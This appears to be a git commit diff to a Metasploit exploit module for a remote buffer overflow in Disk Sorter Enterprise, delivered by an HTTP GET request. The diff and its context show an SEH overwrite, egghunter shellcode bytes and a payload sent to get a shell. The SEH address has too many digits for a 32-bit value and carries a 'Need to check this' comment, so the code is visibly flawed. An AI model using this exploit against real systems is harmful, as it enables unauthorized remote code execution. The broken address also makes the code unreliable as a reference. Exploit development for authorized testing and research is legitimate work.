e1d62add78111e49cc7a34299abf31d51ce4c8cf
Carter <cbawsome77@gmail.com>
2017-03-22 09:21:37 -0400

    Update disk_sorter_get_bof.rb

--- disk sorter enterprise/disk_sorter_get_bof.rb
+++ disk sorter enterprise/disk_sorter_get_bof.rb
@@ -6,9 +6,9 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Exploit::Remote
-  Rank = AverageRanking
+  Rank = GreatRanking
 
-  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Exploit::Remote
     #JMP Short = EB 05
     nSEH = "\x90\x90\xEB\x05" #Jump short 5
 
-    SEH = [0x268525566].pack('L<')
+    SEH = [0x268525566].pack('L<')  # Need to check this
 
     egg = "w00tw00t"
     egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
@@ -63,7 +63,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => '/' + payload_final
+      'uri'    => "/#{payload_final}"
       })
     print_status('Waiting for shell...')
     handler
